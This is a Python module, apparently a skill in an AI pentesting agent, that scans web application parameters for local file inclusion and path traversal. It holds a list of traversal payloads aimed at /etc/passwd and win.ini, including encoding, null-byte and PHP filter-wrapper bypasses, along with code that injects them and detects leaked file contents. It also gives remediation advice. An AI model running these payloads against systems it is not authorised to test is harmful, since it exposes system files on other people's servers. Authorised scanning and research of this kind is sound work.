"""
LFI & Path Traversal Autonomous Skill
======================================
Comprehensive Autonomous Skill for Local File Inclusion & Directory Traversal
with deep bypass encoding, PHP wrapper analysis, and OS fingerprinting.
"""
import re
import time
import base64
import logging
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx
from agents.skills.base_skill import BaseSkill, SkillResult, SkillState

log = logging.getLogger("lfi_skill")


class LFISkill(BaseSkill):
    name: str = "LFISkill"
    vuln_type: str = "lfi"
    cwe: str = "CWE-22"
    owasp_top10: str = "A01:2021 — Broken Access Control"
    default_severity: str = "High"

    LFI_PAYLOADS: List[Tuple[str, str, str]] = [
        # (payload, description, os_type)
        ("../../../../etc/passwd", "Standard Unix traversal", "unix"),
        ("..%2f..%2f..%2f..%2fetc%2fpasswd", "URL encoded Unix traversal", "unix"),
        ("..%252f..%252f..%252f..%252fetc%252fpasswd", "Double URL encoded Unix traversal", "unix"),
        ("....//....//....//....//etc/passwd", "Nested slash strip bypass", "unix"),
        ("/etc/passwd", "Direct absolute path", "unix"),
        ("../../../../etc/passwd%00", "Null byte termination", "unix"),
        ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP base64 wrapper", "unix"),
        ("php://filter/resource=/etc/passwd", "PHP resource wrapper", "unix"),
        ("..\\..\\..\\..\\windows\\win.ini", "Standard Windows traversal", "windows"),
        ("../../../../windows/win.ini", "Forward slash Windows traversal", "windows"),
        ("C:\\windows\\win.ini", "Direct Windows absolute path", "windows"),
        ("..%5c..%5c..%5c..%5cwindows%5cwin.ini", "URL encoded Windows traversal", "windows"),
        ("php://filter/convert.base64-encode/resource=C:\\windows\\win.ini", "PHP base64 Windows wrapper", "windows"),
    ]

    UNIX_PATTERNS = [
        re.compile(r"root:[x*]?:0:0:", re.I),
        re.compile(r"daemon:[x*]?:[0-9]+:[0-9]+:", re.I),
        re.compile(r"nobody:[x*]?:[0-9]+:[0-9]+:", re.I),
        re.compile(r"bin:[x*]?:[0-9]+:[0-9]+:", re.I),
    ]

    WIN_PATTERNS = [
        re.compile(r"\[fonts\]", re.I),
        re.compile(r"\[extensions\]", re.I),
        re.compile(r"\[mci extensions\]", re.I),
        re.compile(r"\[files\]", re.I),
    ]

    def can_handle(self, param_name: str, url: str = "", sample_value: str = "") -> float:
        p_lower = param_name.lower()
        if any(kw in p_lower for kw in ("file", "path", "page", "doc", "folder", "root", "template", "include", "dir", "read", "view")):
            return 0.95
        if any(kw in p_lower for kw in ("name", "item", "load", "src", "ref")):
            return 0.70
        return 0.40

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        qs[param] = [value]
        new_q = urlencode(qs, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))

    async def run(self, target_url: str, param_name: str, **kwargs) -> SkillResult:
        res = SkillResult(
            vuln_type="lfi",
            tool=self.name,
            cwe=self.cwe,
            owasp_top10=self.owasp_top10,
            endpoint=target_url,
            param_name=param_name,
            severity=self.default_severity,
        )

        transport = None
        if self.proxy:
            try:
                transport = httpx.AsyncHTTPTransport(proxy=self.proxy, verify=False)
            except Exception:
                pass

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PentestAI-LFISkill",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }

        async with httpx.AsyncClient(transport=transport, timeout=self.timeout, verify=False) as client:
            # Baseline check
            try:
                base_r = await client.get(target_url, headers=headers)
                base_body = base_r.text
            except Exception as e:
                res.logs.append(f"[LFI] Failed to reach target: {e}")
                return res

            for payload, desc, target_os in self.LFI_PAYLOADS:
                test_url = self._inject_param(target_url, param_name, payload)
                try:
                    r = await client.get(test_url, headers=headers)
                    body = r.text

                    matched_pattern = None
                    if target_os == "unix":
                        for pat in self.UNIX_PATTERNS:
                            m = pat.search(body)
                            if m:
                                matched_pattern = m.group(0)
                                break
                    elif target_os == "windows":
                        for pat in self.WIN_PATTERNS:
                            m = pat.search(body)
                            if m:
                                matched_pattern = m.group(0)
                                break

                    # Check base64 wrapper response
                    if "base64" in payload and not matched_pattern:
                        b64_matches = re.findall(r"([A-Za-z0-9+/]{40,}={0,2})", body)
                        for b64_str in b64_matches:
                            try:
                                decoded = base64.b64decode(b64_str).decode("utf-8", errors="ignore")
                                if any(pat.search(decoded) for pat in (self.UNIX_PATTERNS + self.WIN_PATTERNS)):
                                    matched_pattern = f"Base64 decoded file leak: {decoded[:100]}"
                                    break
                            except Exception:
                                pass

                    if matched_pattern:
                        res.verified = True
                        res.confidence = 0.98
                        res.severity = "Critical"
                        res.title = f"Local File Inclusion (LFI) / Path Traversal ({target_os.upper()}) via {param_name!r}"
                        res.payload_used = payload
                        res.evidence = f"Signature matched: {matched_pattern} | Response snippet: {body[:250]}"
                        res.remediation = (
                            "1. Use an allowlist for permitted file paths or filenames.\n"
                            "2. Use basename stripping (e.g. os.path.basename()) to prevent directory traversal.\n"
                            "3. Restrict file system permissions and avoid direct parameter-to-path concatenation."
                        )
                        res.evidence_sources = ["LFISkill/SignatureMatch"]
                        res.logs.append(f"[LFI] ✅ CONFIRMED: {payload} matched {matched_pattern}")
                        return res

                except Exception as e:
                    res.logs.append(f"[LFI] Error testing {payload}: {e}")

        res.logs.append(f"[LFI] Clean: no file inclusion verified for {param_name}")
        return res
